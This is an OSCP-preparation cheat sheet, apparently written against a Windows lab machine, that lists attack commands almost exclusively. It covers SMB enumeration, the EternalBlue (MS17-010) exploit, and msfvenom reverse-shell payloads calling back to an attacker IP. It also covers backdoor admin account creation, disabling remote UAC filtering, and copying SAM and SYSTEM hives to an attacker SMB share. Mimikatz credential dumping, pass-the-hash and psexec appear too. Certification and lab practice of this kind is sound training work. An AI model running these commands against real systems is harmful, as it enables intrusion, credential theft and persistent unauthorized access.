# OSCP Cheat Sheets Windows
Preparation for OSCP

## RECON

#### SMB
```Shell
nmap -Pn -sT -n --script smb-enum-shares.nse  10.10.10.40 -p 135,139,445
```
```Shell
smbclient -L 10.10.10.40 -N 
smbclient //10.10.10.40/Users -N
```
```Shell
smbmap -H 10.10.10.40 -u ''
```
```Shell
mkdir smbFolder
mount -t cifs //10.10.10.40/Users /tmp/smbFolder -o username=null,password=null,domain=WORKGROUP,rw
```
```Shell
smbcacls //10.10.10.40/Users Admin/Desktop -N
smbcacls //10.10.10.40/Users Admin/Desktop -N | grep Everyone
```

## Vulnerability Discovery

```Shell
nmap -Pn -sT -n --script "vuln and safe" 10.10.10.40 -p 135,139,445
```

```Shell
searchsploit eternalblue
searchsploit -x 42315
searchsploit -m 42315
```

## Explotation

#### Eternalblue
```Shell
wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/42315.py -O mysmb.py
python 42315.py 10.10.10.40
```

```Shell
msfvenom -p windows/x64/shell_reverse_tcp -f exe -o exploit.exe EXITFUNC=thread LHOST=10.10.14.28 LPORT=4444
python 42315.py 10.10.10.40 samr exploit.exe 
```

```Shell
git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git
python eternal_checker.py 10.10.10.40

./shell_prep.sh 
python eternalblue_exploit7.py 10.10.10.40 sc_x64.bin 

msfvenom -p windows/x64/shell_reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=10.10.14.28 LPORT=4444
python eternalblue_exploit7.py 10.10.10.40 sc_x64_msf.bin
```

## Post Explotation

#### Windows Users
```Shell
net users
net user admin admin /add
net localgroup administrators
net localgroup administrators admin /add
net localgroup "Remote Desktop Users" admin /add
```

#### Crackmapexec
```Shell
crackmapexec smb 10.10.10.40 -u 'admin' -p 'admin'
cmd /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
crackmapexec smb 10.10.10.40 -u 'admin' -p 'admin' -x 'whoami'
```
```Shell
crackmapexec smb 10.10.10.40 -u 'admin' -p 'admin' --sam
crackmapexec smb 10.10.10.40 -u 'Administrator' -H cdf51b162460b7d5bc898f493751a0cc -x 'whoami'
```
```Shell
crackmapexec smb 10.10.10.40 -u 'Administrator' -H cdf51b162460b7d5bc898f493751a0cc -M mimikatz -o COMMAND="privilege::debug token::elevate sekurlsa::logonpasswords exit"
```

#### Pass the hash
```Shell
pth-winexe -U WORKGROUP/Administrator%aad3b435b51404eeaad3b435b51404ee:cdf51b162460b7d5bc898f493751a0cc //10.10.10.40 cmd.exe
cat /root/.cme/logs/Mimikatz-10.10.10.40-2021-04-28_212350.log
```

#### Windows SAM
```Shell
reg save HKLM\SAM sam.backup
reg save HKLM\SYSTEM system.backup

impacket-smbserver smbfolder $(pwd)
copy sam.backup \\10.10.14.28\smbfolder\sam
copy system.backup \\10.10.14.28\smbfolder\system

pwdump system sam 
```

#### Windows psexec
```Shell
python /opt/impacket/examples/psexec.py WORKGROUP/admin:admin\@10.10.10.40
```
